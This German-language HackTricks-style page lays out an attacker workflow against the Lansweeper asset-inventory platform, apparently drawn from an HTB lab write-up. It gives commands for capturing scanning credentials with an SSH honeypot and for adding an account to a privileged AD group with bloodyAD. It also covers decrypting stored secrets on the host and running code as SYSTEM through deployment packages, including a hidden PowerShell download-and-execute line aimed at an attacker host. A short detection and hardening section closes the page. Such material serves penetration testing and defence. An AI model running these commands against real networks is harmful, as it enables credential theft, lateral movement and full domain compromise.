# Lansweeper Missbrauch: Credential Harvesting, Secrets Decryption und Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper ist eine IT-Asset-Discovery- und Inventarisierungsplattform, die häufig auf Windows bereitgestellt und in Active Directory integriert wird. Anmeldeinformationen, die in Lansweeper konfiguriert sind, werden von seinen Scanning-Engines verwendet, um sich gegenüber Assets über Protokolle wie SSH, SMB/WMI und WinRM zu authentifizieren. Fehlkonfigurationen ermöglichen häufig:

- Abfangen von Anmeldeinformationen durch Umleiten eines Scanning Targets auf einen von Angreifern kontrollierten Host (honeypot)
- Missbrauch von AD ACLs, die durch Lansweeper-bezogene Gruppen offengelegt werden, um Remotezugriff zu erlangen
- On-Host-Entschlüsselung der in Lansweeper konfigurierten secrets (connection strings und gespeicherte Scanning Credentials)
- Code-Ausführung auf verwalteten Endpunkten über die Deployment-Funktion (läuft häufig als SYSTEM)

Diese Seite fasst praktische Angreifer-Workflows und Befehle zusammen, um diese Verhaltensweisen während Engagements auszunutzen.

## 1) Scanning Credentials via honeypot abfangen (SSH-Beispiel)

Idee: Erstelle ein Scanning Target, das auf deinen Host zeigt, und ordne vorhandene Scanning Credentials diesem Target zu. Wenn der Scan ausgeführt wird, versucht Lansweeper, sich mit diesen Anmeldeinformationen zu authentifizieren, und dein honeypot zeichnet sie auf.

Schritte (web UI):
- Scanning → Scanning Targets → Add Scanning Target
- Type: IP Range (or Single IP) = your VPN IP
- Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
- Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:
```yaml
# sshesame.conf
server:
listen_address: 10.10.14.79:2022
```

```bash
# Install and run
sudo apt install -y sshesame
sshesame --config sshesame.conf
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```
Validiere erfasste creds gegen DC-Dienste:
```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Hinweise
- Funktioniert ähnlich für andere Protokolle, wenn wir den Scanner zu unserem listener zwingen können (SMB/WinRM honeypots, etc.). SSH ist oft am einfachsten.
- Viele Scanner identifizieren sich mit eindeutigen Client-Bannern (z. B. RebexSSH) und versuchen harmlose Befehle (uname, whoami, etc.).

## 2) AD ACL abuse: erlange Remotezugriff, indem du dich zu einer App-Admin-Gruppe hinzufügst

Verwende BloodHound, um die effektiven Rechte des kompromittierten Kontos zu ermitteln. Eine häufige Entdeckung ist eine scanner- oder anwendungsspezifische Gruppe (z. B. “Lansweeper Discovery”), die GenericAll über einer privilegierten Gruppe hält (z. B. “Lansweeper Admins”). Wenn die privilegierte Gruppe außerdem Mitglied der “Remote Management Users” ist, wird WinRM verfügbar, sobald wir uns selbst hinzufügen.

Beispiele für die Sammlung:
```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```
GenericAll an einer Gruppe mit BloodyAD (Linux) ausnutzen:
```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Dann eine interaktive Shell erhalten:
```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```
Tipp: Kerberos-Operationen sind zeitkritisch. Wenn du auf KRB_AP_ERR_SKEW stößt, synchronisiere zuerst mit dem DC:
```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```
## 3) Entschlüsseln von in Lansweeper konfigurierten Geheimnissen auf dem Host

Auf dem Lansweeper-Server speichert die ASP.NET-Site typischerweise einen verschlüsselten Connection-String und einen symmetrischen Schlüssel, der von der Anwendung verwendet wird. Mit entsprechendem lokalen Zugriff können Sie den DB-Connection-String entschlüsseln und anschließend gespeicherte Scan-Zugangsdaten extrahieren.

Typische Speicherorte:
- Web-Config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
- `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Anwendungsschlüssel: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Verwenden Sie SharpLansweeperDecrypt, um die Entschlüsselung und das Auslesen gespeicherter Anmeldedaten zu automatisieren:
```powershell
# From a WinRM session or interactive shell on the Lansweeper host
# PowerShell variant
Upload-File .\LansweeperDecrypt.ps1 C:\ProgramData\LansweeperDecrypt.ps1   # depending on your shell
powershell -ExecutionPolicy Bypass -File C:\ProgramData\LansweeperDecrypt.ps1
# Tool will:
#  - Decrypt connectionStrings from web.config
#  - Connect to Lansweeper DB
#  - Decrypt stored scanning credentials and print them in cleartext
```
Die erwartete Ausgabe enthält DB-Verbindungsdetails und Klartext-Scanning-Zugangsdaten, wie Windows- und Linux-Konten, die im gesamten Bestand verwendet werden. Diese haben oft erhöhte lokale Rechte auf Domain-Hosts:
```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```
Verwende wiederhergestellte Windows scanning creds für privilegierten Zugriff:
```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```
## 4) Lansweeper Deployment → SYSTEM RCE

Als Mitglied der “Lansweeper Admins” zeigt die Web UI Deployment und Configuration an. Unter Deployment → Deployment packages kannst du Packages erstellen, die beliebige Befehle auf ausgewählten Assets ausführen. Die Ausführung erfolgt durch den Lansweeper-Service mit hohen Rechten und führt zu Codeausführung als NT AUTHORITY\SYSTEM auf dem ausgewählten Host.

Grober Ablauf:
- Erstelle ein neues Deployment package, das einen PowerShell- oder cmd-Einzeiler ausführt (reverse shell, add-user, etc.).
- Wähle das gewünschte Asset aus (z. B. den DC/Host, auf dem Lansweeper läuft) und klicke auf Deploy/Run now.
- Erlange deine Shell als SYSTEM.

Beispiel-Payloads (PowerShell):
```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```
OPSEC
- Deployment-Aktionen sind laut und hinterlassen Logs in Lansweeper und Windows-Ereignisprotokollen. Mit Bedacht einsetzen.

## Erkennung und Härtung

- Anonyme SMB-Aufzählungen einschränken oder entfernen. Auf RID cycling und anomalen Zugriff auf Lansweeper-Freigaben überwachen.
- Egress-Kontrollen: ausgehende SSH/SMB/WinRM-Verbindungen von Scanner-Hosts blockieren oder stark einschränken. Alarm bei nicht-standardmäßigen Ports (z. B. 2022) und ungewöhnlichen Client-Bannern wie Rebex.
- Protect `Website\\web.config` and `Key\\Encryption.txt`. Secrets extern in einen Vault auslagern und bei Offenlegung rotieren. Erwägen Sie Servicekonten mit minimalen Rechten und gMSA, wo möglich.
- AD-Überwachung: Alarm bei Änderungen an Lansweeper-bezogenen Gruppen (z. B. “Lansweeper Admins”, “Remote Management Users”) und bei ACL-Änderungen, die GenericAll/Write-Mitgliedschaften für privilegierte Gruppen gewähren.
- Deployment-Paket-Erstellungen/Änderungen/Ausführungen auditieren; Alarm bei Paketen, die cmd.exe/powershell.exe starten oder unerwartete ausgehende Verbindungen herstellen.

## Verwandte Themen
- SMB/LSA/SAMR-Aufzählung und RID cycling
- Kerberos password spraying und Überlegungen zur clock skew
- BloodHound-Pfad-Analyse von application-admin groups
- WinRM-Nutzung und lateral movement

## Referenzen
- [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [BloodHound CE](https://github.com/SpecterOps/BloodHound)

{{#include ../../banners/hacktricks-training.md}}
